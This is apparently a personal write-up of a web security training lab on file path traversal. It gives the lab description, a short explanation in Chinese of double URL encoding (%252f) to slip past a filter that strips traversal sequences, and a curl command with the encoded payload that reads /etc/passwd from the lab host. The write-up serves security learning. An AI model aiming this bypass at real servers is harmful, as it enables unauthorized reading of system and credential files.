# Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

This lab contains a file path traversal vulnerability in the display of product images.

The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the /etc/passwd file.

## LFI
* 這一題也差不多，只是這一題會給 urldecode，所以說先給一個 %25 decode 成 % 之後再 decode 一次變成 / 這樣就可以 bypass 他的 waf
```
payload = curl  https://acc31f591f9092a1c01f97d8006300e8.web-security-academy.net/image\?filename\=..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
```